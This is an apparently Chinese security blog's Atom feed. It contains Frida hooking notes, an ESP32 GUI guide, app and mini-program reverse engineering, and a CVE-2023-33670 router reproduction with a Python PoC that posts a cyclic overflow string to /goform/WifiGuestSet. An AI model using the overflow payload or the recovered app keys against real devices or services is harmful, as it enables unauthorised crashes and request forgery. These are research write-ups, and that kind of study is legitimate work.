<?xml version='1.0' encoding='utf-8'?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <id>https://az0x01-blog.vercel.app/</id>
  <title><![CDATA[Az's Blog]]></title>
  <subtitle><![CDATA[anything]]></subtitle>
  <icon>https://az0x01-blog.vercel.app/favicon.png</icon>
  <link href="https://az0x01-blog.vercel.app" />
  <link href="https://az0x01-blog.vercel.app/atom.xml" rel="self" type="application/atom+xml" />
  <updated>2023-11-06T15:06:52.762Z</updated>
  <author>
    <name><![CDATA[Az]]></name>
  </author>
  <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
  <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
  <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
  <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  <entry>
    <title type="html"><![CDATA[Frida 学习笔记]]></title>
    <link href="https://az0x01-blog.vercel.app/20231106" />
    <id>https://az0x01-blog.vercel.app/20231106</id>
    <published>2023-11-06T00:00:00.000Z</published>
    <updated>2023-11-06T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="环境搭建"><a href="#环境搭建">环境搭建</a></h2><ul><li>安装 node 和 npm，git 拉取 frida-agent-example 仓库</li><li>下载版本对应的 frida、 frida-tools、 frida-server</li><li>在手机的 data/local/tmp 下运行 frida-server </li></ul><h2 id="android-虚拟机搭建"><a href="#android-虚拟机搭建">Android 虚拟机搭建</a></h2><h3 id="环境配置"><a href="#环境配置">环境配置</a></h3><ul><li>VMware 下的 Linux 虚拟机，有完整 frida 环境</li><li>使用 Genymotion 的 Android x86_64 虚拟机</li></ul><h3 id="网络配置"><a href="#网络配置">网络配置</a></h3><p>默认配置均为NAT ，需要全部更改为桥接:</p><ul><li><p>VMware 需要启用 复制物理地址</p></li><li><p>在 Genymotion 的设置中将网络状态改为桥接</p></li><li><p>在 VirtualBox 中将安卓虚拟机的网卡 2 改为桥接, 确认和 VMware 桥接至同一网卡，且将两个网卡的混杂模式改为全部允许</p></li></ul><h3 id="连接使用"><a href="#连接使用">连接使用</a></h3><ul><li><p>在kali中使用 <code>adb connnect &lt;安卓虚拟机IP&gt;</code> 连接adb</p></li><li><p>使用 <code>adb push</code>将对应的 frida-server 文件推到 <em>/data/local/tmp</em> 文件夹下并赋予权限，不知什么原因，这里的64位文件无法正常使用，但32位的没有问题</p></li><li><p>使用 <code>./frida-server-15.2.2-android-x86 -l 0.0.0.0:8888</code>启用网络模式连接</p></li><li><p>现在 <code>frida-ps -H 192.168.0.232:8888 -a</code>就可以正常使用了， 还可以用<code>objection -N -h 192.168.0.232 -p 8888 -g com.android.settings explore</code> 使用 objection (192.168.0.232 是 Android IP)</p></li></ul><h2 id="hook-demo"><a href="#hook-demo">Hook Demo</a></h2><ul><li>在 frida-agent-example 根目录下新建一个 hello.js 文件，代码如下：</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function hook() &#123;</div><div class='line'>    // frida 的入口</div><div class='line'>    Java.perform(function () &#123;</div><div class='line'>        // 以下为功能实现代码</div><div class='line'>        var settings = Java.use("com.android.settings.DisplaySettings");</div><div class='line'>        var getMetricsCategory_func = settings.getMetricsCategory;</div><div class='line'>        console.log("log:")</div><div class='line'>        getMetricsCategory_func.implementation = function () &#123;</div><div class='line'>            var result = this.getMetricsCategory()</div><div class='line'>            console.log("log:", '===&gt;', result)</div><div class='line'>            return result</div><div class='line'>        &#125;</div><div class='line'>    &#125;)</div><div class='line'>&#125;</div><div class='line'>hook();</div><div class='line'>// 或者: setTimeout(hook), 这里的setTimeout不是js标准库的setTimeout，作用和frida的javascript线程有关</div></code></div></pre><!-- HTML_TAG_END --><ul><li>在Android上启动 frida-server，添加 <code>-l 0.0.0.0:8888</code> 可以启用网络监听</li><li>使用 <code>frida -U -f com.android.settings -l hello.js</code> 运行 ，这时点击设置中的显示选项就会打印Hook值（console.log 打印的值）</li></ul><blockquote><p>-U 为 通过 USB 连接 、-f 为使用 spawn 模式</p></blockquote><h2 id="常用插件"><a href="#常用插件">常用插件</a></h2><ul><li><code>Objection</code>  ，使用pip安装，请注意安装顺序，先安装<code>frida</code>和<code>frida-tools</code>，再安装对应版本的<code>Objection</code></li><li><code>WallBreaker</code> , 和<code>Objection</code>一样是用于快速定位类中包含的属性和函数(内存枚举）<a href="https://bbs.kanxue.com/thread-277929.htm" rel="nofollow noopener noreferrer external" target="_blank">教程</a></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>// Objection 常用命令如下：</div><div class='line'></div><div class='line'>// 注入</div><div class='line'>objection -g com.android.settings explore</div><div class='line'>// 通过 -c 可以读取文件中的多条命令执行</div><div class='line'>objection -g com.android.settings explore -c hook.txt</div><div class='line'></div><div class='line'>// 枚举内存中已加载的类</div><div class='line'>android hooking list classes  </div><div class='line'>// 在已加载的类中搜索包含关键字的类</div><div class='line'>android hooking search classes &lt;pattern&gt;</div><div class='line'>// 搜索包含关键字key的方法</div><div class='line'>android hooking search methods &lt;key&gt;</div><div class='line'>// 包含特定字符</div><div class='line'>android hooking list classes &lt;pattern&gt; </div><div class='line'>// 获取指定类中的所有非构造函数的所有方法</div><div class='line'>android hooking list class_methods &lt;class_name&gt; </div><div class='line'>// Hook类中的所有非构造函数的方法(顺序)</div><div class='line'>android hooking watch class &lt;class_name&gt; </div><div class='line'>// Hook 指定函数方法(倒序)</div><div class='line'>android hooking watch class_method com.az.az.loading.setXXXX "xx(overload)" --dump-args --dump-return --dump-backtrace</div><div class='line'>// 主动调用,打印相关实例</div><div class='line'>android heap search instances &lt;classname&gt;</div><div class='line'>// 使用 hashcode 调用实例</div><div class='line'>android heap execute &lt;hashcode&gt; &lt;methodname&gt;</div><div class='line'></div><div class='line'>// 作业系统的使用</div><div class='line'>jobs list</div><div class='line'>jobs kill &lt;Hook ID&gt;</div><div class='line'></div><div class='line'>// 列出进程的所有activity</div><div class='line'>android hooking list activities</div><div class='line'></div><div class='line'>############# 分 界 线 ##############</div><div class='line'></div><div class='line'>// Wallbreaker 的安装和使用</div><div class='line'>mkdir -p ~/.objection/plugins/</div><div class='line'>git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</div><div class='line'></div><div class='line'>// 加载插件</div><div class='line'>objection -g com.example.android explore  -P ~/.objection/plugins</div><div class='line'>// 内存搜索类、实例</div><div class='line'>plugin wallbreaker objectsearch LoginActivity</div><div class='line'>// 根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果 --fullname 打印完整的包名</div><div class='line'>plugin wallbreaker classdump com.example.android.Activity.LoginActivity --fullname</div><div class='line'>// 查看对象的一些属性和方法</div><div class='line'>plugin wallbreaker objectdump 0x2222 --fullname</div></code></div></pre><!-- HTML_TAG_END --><ul><li><code>Zentrace</code> 需要先安装 <code>PyQt5</code> 和 <code>frida</code>，用于关键类定位（ Trace 枚举）</li><li><code>dexdump</code> 用于一代整体加固</li><li><code>frida_fart (FART)</code> 用于二代抽取加壳</li></ul><h2 id="native-层-hook"><a href="#native-层-hook">Native 层 Hook</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>Java.perform(function () &#123;  // 也可以不写（确保线程attach到安卓虚拟机上才执行）</div><div class='line'>    ...</div><div class='line'>    // Hook 模板</div><div class='line'>    Interceptor.attach(addr,&#123;// addr 是目标函数的地址</div><div class='line'>        onEnter(args) &#123;</div><div class='line'>            /* do something with args */</div><div class='line'>        &#125;,</div><div class='line'>        onLeave(retval) &#123;</div><div class='line'>            /* do something with retval */</div><div class='line'>        &#125;</div><div class='line'>    &#125;);</div><div class='line'>    ...</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>目的是寻找 Java 层函数在 native 层中的对应<strong>地址</strong></li><li>在 <code>Objection</code> 中执行 <code>memory list modules</code>查看你内存中的 <code>.so </code>文件，使用 <code>--json output.json</code> 来导出</li><li>执行<code>memory list exports XXX.so</code>  查看相应文件导出的所有符号，可以找到函数名对应的地址，但这里的绝对地址在每次加载时都不同，不变的是函数地址相对于基地址的偏移，通过偏移可以在静态分析时找到对应函数，使用 <code>--json output.json</code> 来导出(如果在Java层函数编写时未添加<code>extern C</code> 描述符，会因为 C++ 的 <code>name mangling</code> 导致编译完成的函数名发生一些变化，被破坏的函数名可以使用<code>C++filt</code>工具恢复)</li></ul><h3 id="native层导数"><a href="#native层导数">native层导数</a></h3><p>使用Frida提供的 API 获得函数首地址：</p><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function hook_native() &#123;</div><div class='line'>    var addr = Module.getExportByName("libnativetty.so", "Java_az_test_nativetty_MainActivity_stringFromJNI");// 目标.so 和 函数名</div><div class='line'>    Interceptor.attach(addr, &#123;</div><div class='line'>        onEnter: function (args) &#123;</div><div class='line'>            console.log("jnienv =&gt; ", args[0])</div><div class='line'>            console.log("jobj pointer =&gt; ", args[1])</div><div class='line'></div><div class='line'>        &#125;,</div><div class='line'>        onLeave: function (retval) &#123;</div><div class='line'>            console.log("retval =&gt; ", Java.vm.getEnv().getStringUtfChars(retval, null).readCString())</div><div class='line'>            console.log("——————————————————————————————")</div><div class='line'>        &#125;</div><div class='line'></div><div class='line'>    &#125;)</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>setImmediate(hook_native)</div></code></div></pre><!-- HTML_TAG_END --><h3 id="非native层导出函数使用动态注册的jni函数"><a href="#非native层导出函数使用动态注册的jni函数">非native层导出函数（使用动态注册的JNI函数）</a></h3><p>通过获得模块地址相对于基地址的偏移来确定函数的绝对地址</p><ul><li>项目 [frida_hook_libart](<a href="https://github.com/lasting-yang/frida_hook_libart" rel="nofollow noopener noreferrer external" target="_blank">lasting-yang/frida_hook_libart: Frida hook some jni functions (github.com)</a>) 包含JNI函数和 art 函数的Hook 脚本,使用其中的 <code>hook_RegisterNatives.js</code>,可以获得偏移</li><li>在获得偏移后使用frida提供的api <code>Module.findBaseAddress</code> 获得函数地址并进行Hook</li></ul><h3 id="lib库的hook"><a href="#lib库的hook">lib库的Hook</a></h3><p>使用 <code>memory list exports XXX.so --json ./output.json</code> 导出模块中的导出函数</p><p>使用 frida-trace 可以快速trace函数 <code>frida-trace -UF -I libXXX.so</code></p><p>使用 Frida 写文件</p><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function write(path, contents)&#123;</div><div class='line'>    var fopen_addr = Module.findExportByName("libc.so", "fopen");</div><div class='line'>    var fputs_addr = Module.findExportByName("libc.so", "fputs");</div><div class='line'>    var fclose_addr = Module.findExportByName("libc.so", "fclose");</div><div class='line'></div><div class='line'>    var fopen = new NativeFunction(fopen_addr, ["pointer", "pointer"])</div><div class='line'>    var puts = new NativeFunction(fputs_addr, "int", ["pointer", "pointer"])</div><div class='line'>    </div><div class='line'>    var fileName = Memory.allocUtf8String(path);</div><div class='line'>    var mode = Memory.allocUtf8String("a+");</div><div class='line'></div><div class='line'>    var fp = fopen(fileName, mode);</div><div class='line'>    var contentHello = Memory.allocUtf8String(contents);</div><div class='line'>    var ret = fputs(contentHello, fp);</div><div class='line'>    fclose(fp);</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><h2 id="主动调用rpc入门"><a href="#主动调用rpc入门">主动调用、RPC入门</a></h2><p>RPC 指通过网络从远程计算机程序上请求服务, 需要将js脚本进行处理，使其被python程序调用，便于使用。例：</p><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'># loader.py</div><div class='line'>import frida, time</div><div class='line'></div><div class='line'>device = frida.get_usb_device()</div><div class='line'>pid = device.spawn("com.symbolic.pitchlab") #目标包名</div><div class='line'></div><div class='line'>device.resume(pid)</div><div class='line'>time.sleep(1)</div><div class='line'>session = device.attach(pid)</div><div class='line'></div><div class='line'>with open("tty.js") as f:</div><div class='line'>    script = session.create_script(f.read())</div><div class='line'>    script.load()</div><div class='line'>    while(True):</div><div class='line'>        script.exports.output_func() #js导出函数调用</div><div class='line'>        time.sleep(0.5)</div></code></div></pre><!-- HTML_TAG_END --><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>// tty.js</div><div class='line'>function hook_native() &#123;</div><div class='line'>    var result; // 需要放在 perform 外面</div><div class='line'>    Java.perform(function () &#123;</div><div class='line'>        var addr = Module.getExportByName("libPitchLab.so", "Java_com_symbolic_pitchlab_PitchLabNative_processStreamedSamples"); //目标库文件和函数</div><div class='line'>        Interceptor.attach(addr, &#123;</div><div class='line'>            onEnter: function (args) &#123;</div><div class='line'>                for (let index = 0; index &lt; 14; index++) &#123;</div><div class='line'>                    const element = args[index];</div><div class='line'>                    console.log( element)</div><div class='line'>                &#125;</div><div class='line'>            &#125;,</div><div class='line'>            onLeave: function (retval) &#123;</div><div class='line'>                //do something</div><div class='line'>            &#125;</div><div class='line'>        &#125;)</div><div class='line'>    &#125;)</div><div class='line'>    return result</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>rpc.exports = &#123;</div><div class='line'>    output_func: hook_native</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><h2 id="adb-命令拾遗"><a href="#adb-命令拾遗">adb 命令拾遗</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>netstat -alpe</div><div class='line'>lsof -p 8888 -l</div><div class='line'>adb shell dumpsys activity top</div><div class='line'>adb shell dumpsys package &lt;package_name&gt;</div><div class='line'>adb shell dumpsys dbinfo &lt;package_name&gt;</div><div class='line'>adb shell pm list packages</div><div class='line'>adb shell am start-activity -D -N com.example.az/.MainActivity</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
  </entry>
  <entry>
    <title type="html"><![CDATA[CVE-2023-33670 复现]]></title>
    <link href="https://az0x01-blog.vercel.app/20230823" />
    <id>https://az0x01-blog.vercel.app/20230823</id>
    <published>2023-08-23T00:00:00.000Z</published>
    <updated>2023-09-19T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[以及水到的第一个 CVE 编号]]></summary>
    <content type="html">
      <![CDATA[<h2 id="bin-文件的处理"><a href="#bin-文件的处理">bin 文件的处理</a></h2><p>使用 binwalk 对 bin 文件进行处理</p><p>安装 : <code>apt install binwalk</code></p><p>命令 : <code>binwalk -Me ./*.bin</code></p><p>解包后即为标准的 unix 文件系统</p><h2 id="qemu-环境搭建"><a href="#qemu-环境搭建">qemu 环境搭建</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  apt-get install qemu-system</div><div class='line'>  apt-get install qemu-user-static</div></code></div></pre><!-- HTML_TAG_END --><p>以 <code>./bin/httpd</code> 为目标，使用<code>file</code>查看信息，LSB 选择 mipsel</p><p>进入到解包后的<strong>*bin/extracted/squashfs-root/</strong>目录下</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  cp $(which qemu-mipsel-static) ./</div><div class='line'>  sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</div></code></div></pre><!-- HTML_TAG_END --><p>启动<strong>目标 httpd</strong>，由于存在检查，失败</p><h2 id="修补程序去掉-check"><a href="#修补程序去掉-check">修补程序，去掉 check</a></h2><p>Patch 前：</p><p><img src="./image-20230823195926271.png" alt="image-20230823195926271" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>使用 IDAPro 进行 Patch</p><p><img src="./image-20230823200528802.png" alt="image-20230823200528802" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>通过搜索<strong>Welcome</strong>关键字，找到程序中断点，</p><p>切换到图模式，可以确认在 <code>bgez</code> 处进行判断，只需要将原来的 <code>&gt;=</code> 修改即可，也就是将 <code>bgez</code> 改为 <code>bltz</code></p><p>在 <code>Edit -&gt; Patch program -&gt; Change byte</code>中 将<code>0A 00 41 04</code>改为<code>0A 00 01 04</code> 即可</p><p>Patch 后：</p><p><img src="./image-20230823195553164.png" alt="image-20230823195553164" class="rounded-lg my-2" loading="lazy" decoding="async"></p><h2 id="创建-bridge"><a href="#创建-bridge">创建 <code>bridge</code></a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>sudo brctl addbr br0</div><div class='line'>sudo brctl addif br0 eth0 &lt;- [eth0 from your interface on ifconfig]</div><div class='line'>sudo ifconfig br0 up</div><div class='line'>sudo dhclient br0</div></code></div></pre><!-- HTML_TAG_END --><p>如出现<code>Unsupported setsockopt level=65535 optname=128</code></p><p>执行 <code>cp -rf ./webroot_ro/* ./var/webroot/</code> 即可正常运行</p><h2 id="使用-poc-攻击"><a href="#使用-poc-攻击">使用 Poc 攻击</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'>import requests</div><div class='line'></div><div class='line'>host = "192.168.59.136:80"</div><div class='line'>cyclic = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaa"</div><div class='line'></div><div class='line'>def exploit_WifiGuestSet():</div><div class='line'>    url = f"http://&#123;host&#125;/goform/WifiGuestSet"</div><div class='line'>    data = &#123;</div><div class='line'>        b'shareSpeed':cyclic</div><div class='line'>    &#125;</div><div class='line'>    res = requests.post(url=url,data=data)</div><div class='line'>    print(res.content)</div><div class='line'></div><div class='line'>exploit_WifiGuestSet()</div></code></div></pre><!-- HTML_TAG_END --><h2 id="mips-编译测试"><a href="#mips-编译测试">MIPS 编译测试</a></h2><p>安装编译器</p><p><code>sudo apt-get install gcc-mips-linux-gnu</code></p><p>使用下面代码测试</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>#include &lt;stdio.h&gt;</div><div class='line'></div><div class='line'>int main(void) &#123;</div><div class='line'>    printf("hello&#92;n");</div><div class='line'>    return 0;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>编译</p><p><code>mips-linux-gnu-gcc -static hello.c -o hello</code></p><p>运行结果</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>$ cp /usr/bin/qemu-mips-static .</div><div class='line'>$ qemu-mips-static ./hello</div><div class='line'>hello</div></code></div></pre><!-- HTML_TAG_END --><h2 id="照猫画虎"><a href="#照猫画虎">照猫画虎</a></h2><blockquote><p>水到了第一个 CVE 编号 <code>CVE-2023-42320</code></p></blockquote>]]>
    </content>
    <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
  </entry>
  <entry>
    <title type="html"><![CDATA[LVGL 初探]]></title>
    <link href="https://az0x01-blog.vercel.app/20230805" />
    <id>https://az0x01-blog.vercel.app/20230805</id>
    <published>2023-08-05T00:00:00.000Z</published>
    <updated>2023-08-05T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[使用 SquareLine Stdio 的 GUI 开发]]></summary>
    <content type="html">
      <![CDATA[<h2 id="环境需求"><a href="#环境需求">环境需求</a></h2><ul><li>ESP32-S3-LCD-EV-BOARD</li><li><a href="https://squareline.io/" rel="nofollow noopener noreferrer external" target="_blank">SquareLine Stdio</a> v1.3.1</li><li>ESP-IDF v5.0.2</li></ul><h2 id="创建项目"><a href="#创建项目">创建项目</a></h2><ol><li>在 SquareLine Stdio 的欢迎菜单中选择 Example，选择任意一个示例项目，点击 creat，待相关文件加载完毕</li><li>打开 flie 选项卡的 Project setting 修改 BOARD GROUP 为 Espressif，选择 开发板型号并保存</li><li>在 Font Manager 选项卡的 CREATFONT 下进行 modify 以防报错</li><li>在 Inspector 选项卡的 STYLE(MAIN) 下 确定项目的 Text Font，以便稍后修改</li><li>在 Export 选项卡中导出项目，先 Creat Template project 然后再 Export UI Files</li></ol><h2 id="修改-menuconfig"><a href="#修改-menuconfig">修改 Menuconfig</a></h2><h3 id="修改字体"><a href="#修改字体">修改字体</a></h3><p>在 ESP-IDF 中打开项目 使用 <code>idf.py menuconfig</code> 命令<br>搜索 <code>font 26</code> 选择 LV_FONTMONTSERRAT_26(=n) “Enable Montserrat 26” 启用后保存</p><h3 id="设置-psram-为-120mhz"><a href="#设置-psram-为-120mhz">设置 psram 为 120MHz</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. 搜索 psram</div><div class='line'>2. 选择 SPIRAM_MODE_OCT(=y) "Octal Mode PSRAM"</div><div class='line'>3. 进入 Octal Mode PSRAM</div><div class='line'>4. 进入 Set RAM clock speed</div><div class='line'>5. 选择 120MHz clock speed</div></code></div></pre><!-- HTML_TAG_END --><h3 id="设置-flash-为-120mhz"><a href="#设置-flash-为-120mhz">设置 flash 为 120MHz</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. 搜索 flash</div><div class='line'>2. 选择 ESPTOOLPY_FLASHFREQ_120M(=n) "120MHz"</div><div class='line'>3. 选择 120MHz</div></code></div></pre><!-- HTML_TAG_END --><h3 id="设置-data-cache-line"><a href="#设置-data-cache-line">设置 data cache line</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. 搜索 data cache line</div><div class='line'>2. 选择 ESP_32S3_DATA_CACHE_LINE_64B(=n) "64 Bytes"</div><div class='line'>3. 选择 64Bytes</div></code></div></pre><!-- HTML_TAG_END --><h3 id="开启防撕裂模式"><a href="#开启防撕裂模式">开启防撕裂模式</a></h3><!-- HTML_TAG_START --><pre class="shiki material-default" md="true"><div class="language-id">md</div><div class='code-container'><code><div class='line'>1. 搜索 avoid tearing effect</div><div class='line'>2. 进入 BSP_DISPLAY_LVGL_AVOID_TEAR(=n) "Avoid tearing effect"</div><div class='line'>3. 选择 Avoid tearing effect (NEW),进入 LCD</div><div class='line'>4. 开启 Enable to use double frame buffers 以及 Enable to refresh LCD manually</div><div class='line'>5. 进入 Display， 开启 Avoid tearing effect</div><div class='line'>6. 进入 Select LVGL buffer mode，开启 Direct mode</div></code></div></pre><!-- HTML_TAG_END --><h2 id="编译烧录"><a href="#编译烧录">编译烧录</a></h2><p>在 ESP-IDF 中使用 <code>idf.py build</code> 编译后进行烧录</p>]]>
    </content>
    <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  </entry>
  <entry>
    <title type="html"><![CDATA[小天同学 第三方 APP 开发]]></title>
    <link href="https://az0x01-blog.vercel.app/20230510" />
    <id>https://az0x01-blog.vercel.app/20230510</id>
    <published>2023-05-10T00:00:00.000Z</published>
    <updated>2023-05-15T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<p>官方 APP 使用不便 于是想开发一个使用更便捷的第三方 APP <a href="https://github.com/aixiao0621/Duoheshui" rel="nofollow noopener noreferrer external" target="_blank">项目地址</a></p><h2 id="app-逆向"><a href="#app-逆向">APP 逆向</a></h2><p>抓包 发现 <code>data</code> 有加密 尝试解密失败，试图寻找源码使用工具<a href="https://github.com/hluwa/frida-dexdump" rel="nofollow noopener noreferrer external" target="_blank">frida-dexdump</a> 脱壳，但得到的代码可读性很低，发现有小程序，于是转战</p><h2 id="微信小程序-逆向"><a href="#微信小程序-逆向">微信小程序 逆向</a></h2><blockquote><p>原以为小程序和微信服务器的沟通只是为了拿到手机号明文，于是想要直接使用小程序的请求方式完成登录等全部流程</p></blockquote><ul><li>使用工具 <a href="https://github.com/r3x5ur/unveilr" rel="nofollow noopener noreferrer external" target="_blank">unveilr</a> 直接对<code>__APP__.wxapkg</code>进行解包</li><li>使用<code>微信开发者工具</code>打开解包后的文件并尝试编译，成功 (好运)</li><li>尝试使用 Burpsuite 和 proxifier 对 PC 端小程序抓包，参考了<a href="https://blog.csdn.net/weixin_45031612/article/details/127416319" rel="nofollow noopener noreferrer external" target="_blank">相关教程</a>,寻找登录请求，发现和 APP 抓到的包有相同的加密</li><li>由于解包后的小程序代码有混淆，可读性差，于是直接调试</li><li>小程序的主要 JS 代码位于根目录下，由于其中的函数均声明了 <code>&quot;use strict&quot;</code> 所以先删除</li><li>搜索加密函数 直接使用<code>console.log</code>打印，在调试器里导出为全局变量 就可以进行加解密操作了</li><li>在某些情况下，会提示字符串不是 UTF-8，这时候需要将 <code>\\/</code> 改为 <code>\/</code> 可能还需要增减 <code>=</code> 的数量</li><li>到这里以为已经结束了，抓到的包可以直接解出，但是解密小程序的登录请求后发现里面还有一层加密且无法使用同样的解密方式解密</li><li>解密的微信小程序登录请求包中存在一个名为<code>code</code>的 key 通过查阅微信开发者文档，判断应该是与微信服务器的交流中拿到的，奈何微信的数据包加密十分抽象，没有思路拿到 <code>code</code> 于是思路再次中断</li></ul><h2 id="又回到最初的起点"><a href="#又回到最初的起点">又回到最初的起点🎵</a></h2><ul><li>偶然发现小程序的解密方式对 APP 抓到的包同样适用，于是柳暗花明，拿到验证码登录和打开饮水机的请求方式</li><li>现在只需要复现加解密函数即可，找到 <code>crypto-js</code> 库，发现完全一致，仅需的两个参数：密钥和密钥偏移量，也写在小程序的源码中</li></ul><blockquote><p>上面提到的<code>code</code>应该是微信服务端同时发送到小程序服务端和小程序客户端，一起发送给小程序服务端的还有被加密的手机号，小程序客户端需要用<code>code</code>才能拿到明文手机号</p></blockquote><h2 id="app-开发"><a href="#app-开发">APP 开发</a></h2><ul><li>在伪造请求时要注意发送数据的编码类型</li><li>在新版本中，如果要发送 http 请求，需要在 <code>AndroidManifest.xml</code> 的 <code>application</code> 中 增加 <code>android:usesCleartextTraffic=&quot;true&quot;</code></li><li>可能是由于编码方式的问题 返回的字符串有多余的 <code>\&quot;</code> 和 <code>\\</code> 字符</li><li>在 kotlin 中进行解密操作时，由于 <code>\\/</code> 字符的出现，需要使用三层`<code>对整体字符串进行包裹，使其转为 </code>raw` 后再进行替换操作</li><li>替换字符串时，kotlin 的正则貌似不大好用</li></ul>]]>
    </content>
    <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
    <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  </entry>
  <entry>
    <title type="html"><![CDATA[使用 frida 对 APP 进行脱壳]]></title>
    <link href="https://az0x01-blog.vercel.app/20230401" />
    <id>https://az0x01-blog.vercel.app/20230401</id>
    <published>2023-04-01T00:00:00.000Z</published>
    <updated>2023-04-01T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="android-端的准备"><a href="#android-端的准备">Android 端的准备</a></h2><ol><li>在 <a href="https://github.com/frida/frida" rel="nofollow noopener noreferrer external" target="_blank">frida</a> 仓库中下载<code>frida-server</code>文件，需要与手机架构和 PC 端 frida 版本相对应，解压后可以使用<code>adb push</code> 到手机，也可以使用 <code>MT文件管理器</code>，将其移动到 <code>/data/local/tmp</code> 目录内，赋予 <code>777</code> 权限</li><li>将手机与电脑连接，使用 <code>adb devices</code> 查看连接的设备，确保 adb 正确连接</li></ol><h2 id="pc-端的准备"><a href="#pc-端的准备">PC 端的准备</a></h2><ol><li>使用 <code>pip install frida</code> 命令安装 <a href="https://github.com/frida/frida" rel="nofollow noopener noreferrer external" target="_blank">frida</a></li><li>使用 <code>pip install frida-tools</code> 命令安装 frida-tools  </li><li>使用<code>pip3 install frida-dexdump</code> 安装 <a href="https://github.com/hluwa/FRIDA-DEXDump" rel="nofollow noopener noreferrer external" target="_blank">dexdump</a></li><li>在 cmd 中执行以下命令  </li></ol><!-- HTML_TAG_START --><pre class="shiki material-default" shell="true"><div class="language-id">shell</div><div class='code-container'><code><div class='line'>adb shell  </div><div class='line'>cd /data/local/tmp/  </div><div class='line'>su  </div><div class='line'>./frida-server-android...  </div></code></div></pre><!-- HTML_TAG_END --><h2 id="开始脱壳"><a href="#开始脱壳">开始脱壳</a></h2><ol><li>打开新的 cmd 执行以下命令 <code>frida-dexdump -U -f com.app.pkgname</code> 即可开始脱壳  </li><li>推荐加上 